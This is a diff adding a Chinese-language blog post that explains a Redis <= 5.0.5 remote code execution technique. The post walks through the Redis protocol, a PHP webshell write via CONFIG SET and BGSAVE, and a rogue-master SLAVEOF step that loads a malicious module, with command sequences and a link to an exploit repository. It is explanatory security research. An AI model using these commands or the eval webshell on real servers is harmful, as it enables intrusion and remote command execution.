@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="n0b0dy">
+  <meta name="description" content="n0b0dy&#39;s personal site">
+  
+  
+  <link rel="prev" href="http://n0b0dycn.me/2019/04/alpha-21264/" />
+  
+  <link rel="canonical" href="http://n0b0dycn.me/2019/07/redis-rce/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="shortcut icon" href="http://n0b0dycn.me/favicon.ico" />
+  <link rel="bookmark" href="http://n0b0dycn.me/favicon.ico" type="image/x-icon"　/>
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Redis &lt;= 5.0.5 RCE | n0b0dy&#39;s site
+       
+  </title>
+  <meta name="title" content="Redis &lt;= 5.0.5 RCE | n0b0dy&#39;s site">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "http://n0b0dycn.me/"
+    },
+    "articleSection" : "posts",
+    "name" : "Redis &lt;= 5.0.5 RCE",
+    "headline" : "Redis &lt;= 5.0.5 RCE",
+    "description" : "Redis &lt;= 5.0.5 RCE 本文介绍由LCBC战队队员Pavel Toporkov在zeronights 2018上介绍的redis 4.x RCE攻击。会议slide链接：https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
+攻击场景： * 能够访问远程redis的端口（直接访问或者SSRF） * 对redis服务器可以访问到的另一台服务器有控制权
+本文的exp开源在github上：
+https://github.com/n0b0dyCN/redis-rogue-server
+欢迎大家来star~
+背景知识 redis协议 redis支持两种传输协议，一种是明文传输，其命令如下：
+SET keyname value\n  另一种是经过编码的传输协议：
+*3\r\n$3\r\nSET\r\n$7\r\nkeyname\r\n$5\r\nval ue\r\n  将其格式化大概长这个样子：
+*&lt;number of arguments&gt; CR LF $&lt;number of bytes of argument 1&gt; CR LF &lt;argument data&gt; CR LF ... $&lt;number of bytes of argument N&gt; CR LF &lt;argument data&gt; CR LF  笔者主要使用第二种协议实现exp。
+CONFIG SET CONFIG SET命令用于对redis进行配置。常用如下：
+CONFIG SET dir /VAR/WWW/HTML CONFIG SET dbfilename sh.",
+    "inLanguage" : "en-us",
+    "author" : "n0b0dy",
+    "creator" : "n0b0dy",
+    "publisher": "n0b0dy",
+    "accountablePerson" : "n0b0dy",
+    "copyrightHolder" : "n0b0dy",
+    "copyrightYear" : "2019",
+    "datePublished": "2019-07-07 10:08:33 &#43;0800 &#43;0800",
+    "dateModified" : "2019-07-07 10:08:33 &#43;0800 &#43;0800",
+    "url" : "http://n0b0dycn.me/2019/07/redis-rce/",
+    "wordCount" : "168",
+    "keywords" : [ "web", "n0b0dy&#39;s site"]
+}
+</script>
+
+  
+  <script type="text/javascript"
+        async
+        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[\[','\]\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<style>
+code.has-jax {
+    font: inherit;
+    font-size: 100%;
+    background: inherit;
+    border: inherit;
+    color: #515151;
+}
+</style>
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="http://n0b0dycn.me/">n0b0dy&#39;s site</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/links/" title="">Links</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="http://n0b0dycn.me/">n0b0dy&#39;s site</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/links/" title="">Links</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Redis &lt;= 5.0.5 RCE</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="http://n0b0dycn.me/" rel="author">n0b0dy</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2019-07-07 itemprop="datePublished">July 7, 2019</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="http://n0b0dycn.me/categories/researching/"> Researching </a>
+                        <a href="http://n0b0dycn.me/categories/security/"> Security </a>
+                        
+                </span>
+                <span class="post-tags">
+                    
+                        <section>
+                        <i class="iconfont icon-tag"></i>Tag(s): 
+                        
+                        <span class="tag"><a href="http://n0b0dycn.me/tags/web/">
+                                #web</a></span>
+                        
+                        </section>
+                    
+                    </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          
+
+<h1 id="redis-5-0-5-rce">Redis &lt;= 5.0.5 RCE</h1>
+
+<p>本文介绍由LCBC战队队员Pavel Toporkov在zeronights 2018上介绍的redis 4.x RCE攻击。会议slide链接：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" rel="nofollow noreferrer" target="_blank">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>
+
+<p>攻击场景：
+* 能够访问远程redis的端口（直接访问或者SSRF）
+* 对redis服务器可以访问到的另一台服务器有控制权</p>
+
+<p>本文的exp开源在github上：</p>
+
+<p><a href="https://github.com/n0b0dyCN/redis-rogue-server" rel="nofollow noreferrer" target="_blank">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+
+<p>欢迎大家来star~</p>
+
+<h2 id="背景知识">背景知识</h2>
+
+<h3 id="redis协议">redis协议</h3>
+
+<p>redis支持两种传输协议，一种是明文传输，其命令如下：</p>
+
+<pre><code class="language-redis">SET keyname value\n
+</code></pre>
+
+<p>另一种是经过编码的传输协议：</p>
+
+<pre><code class="language-redis">*3\r\n$3\r\nSET\r\n$7\r\nkeyname\r\n$5\r\nval
+ue\r\n
+</code></pre>
+
+<p>将其格式化大概长这个样子：</p>
+
+<pre><code class="language-redis">*&lt;number of arguments&gt; CR LF
+$&lt;number of bytes of argument 1&gt; CR LF
+&lt;argument data&gt; CR LF
+...
+$&lt;number of bytes of argument N&gt; CR LF
+&lt;argument data&gt; CR LF
+</code></pre>
+
+<p>笔者主要使用第二种协议实现exp。</p>
+
+<h3 id="config-set">CONFIG SET</h3>
+
+<p>CONFIG SET命令用于对redis进行配置。常用如下：</p>
+
+<pre><code class="language-redis">CONFIG SET dir /VAR/WWW/HTML
+CONFIG SET dbfilename sh.php
+SET PAYLOAD '&lt;?php eval($_GET[0]);?&gt;'
+BGSAVE
+</code></pre>
+
+<p>这是之前redis常用的getshell套路。但是由于权限问题，并不是总能成功写入文件。</p>
+
+<h3 id="slaveof">SLAVEOF</h3>
+
+<p>SLAVEOF命令为redis设置主服务器。</p>
+
+<pre><code class="language-redis">127.0.0.1:6379&gt; SLAVEOF 127.0.0.1 7000
+</code></pre>
+
+<p>该命令将端口为6379的服务器的主服务器设置为端口为7000的服务器。端口为6379的服务器将开始同步端口为7000服务器的数据来保证数据的一致性。同时服务器可以随时取消主从状态：</p>
+
+<pre><code class="language-redis">127.0.0.1:6379&gt; SLAVEOF NO ONE
+</code></pre>
+
+<p>SLAVE和MASTER之间的握手机制如下：</p>
+
+<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/redis-4.x-rce/sync-protocol.png" alt="SYNC protocol" class="lazyload"><figcaption class="image-caption">SYNC protocol</figcaption></figure></p>
+
+<p>握手后SLAVE将向MASTER发送PSYNC请求同步，一般有三种状态：</p>
+
+<ul>
+<li>FULLRESYNC：表示需要全量复制</li>
+<li>CONTINUE：表示可以进行增量同步</li>
+<li>ERR：表示主服务器还不支持PSYNC</li>
+</ul>
+
+<h3 id="module-load">MODULE LOAD</h3>
+
+<p>MODULE LOAD命令为redis加载外部的模块，该模块可以自定义。模块编写方法可以参考官方示例：<a href="https://github.com/RedisLabs/RedisModulesSDK" rel="nofollow noreferrer" target="_blank">https://github.com/RedisLabs/RedisModulesSDK</a>。</p>
+
+<p>该命令使用方式如下：</p>
+
+<pre><code class="language-redis">MODULE LOAD /path/to/exp.so
+MODULE UNLOAD exp
+</code></pre>
+
+<h2 id="攻击流程">攻击流程</h2>
+
+<h3 id="rogue-server">Rogue Server</h3>
+
+<p>我们需要建一个服务器来在同步过程中向redis server发送我们的module。服务器要响应redis的请求：</p>
+
+<pre><code class="language-redis">[&gt;] PING - test if a connection is still alive
+[&lt;] +PONG
+[&gt;] REPLCONF - exchange replication information between master and slave
+[&lt;] +OK
+[&gt;] PSYNC/SYNC - synchronize slave state with the master
+[&lt;] +FULLRESYNC
+</code></pre>
+
+<h3 id="步骤">步骤</h3>
+
+<h4 id="将redis设置为我们的slave">将redis设置为我们的slave</h4>
+
+<pre><code class="language-redis">SLAVEOF server port
+</code></pre>
+
+<h4 id="设置redis的数据库文件">设置redis的数据库文件</h4>
+
+<pre><code class="language-redis">CONFIG SET dbfilename exp.so
+</code></pre>
+
+<h4 id="从rogue-server接收module">从rogue server接收module</h4>
+
+<pre><code class="language-redis">+FULLRESYNC &lt;Z*40&gt; 1\r\n$&lt;len&gt;\r\n&lt;payload&gt;
+</code></pre>
+
+<h4 id="加载模块">加载模块</h4>
+
+<pre><code class="language-redis">MODULE LOAD ./exp.so
+</code></pre>
+
+<h3 id="攻击效果">攻击效果</h3>
+
+<p>设置主服务器与数据库文件：
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/redis-4.x-rce/step1.png" alt="step 1" class="lazyload"><figcaption class="image-caption">step 1</figcaption></figure></p>
+
+<p>向redis server发送payload：
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/redis-4.x-rce/step2.png" alt="step 2" class="lazyload"><figcaption class="image-caption">step 2</figcaption></figure></p>
+
+<p>加载模块：
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/redis-4.x-rce/step3.png" alt="step 3" class="lazyload"><figcaption class="image-caption">step 3</figcaption></figure></p>
+
+<p>最终可以实现命令执行：
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/redis-4.x-rce/step4.png" alt="step 4" class="lazyload"><figcaption class="image-caption">step 4</figcaption></figure></p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>n0b0dy </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=http://n0b0dycn.me/2019/07/redis-rce/>http://n0b0dycn.me/2019/07/redis-rce/</span>
+            </p>
+            
+            
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="http://n0b0dycn.me/2019/04/alpha-21264/" class="prev" rel="prev" title="Alpha 21264"><i class="iconfont icon-left"></i>&nbsp;Alpha 21264</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2011 - 2019</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="http://n0b0dycn.me/">n0b0dy</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
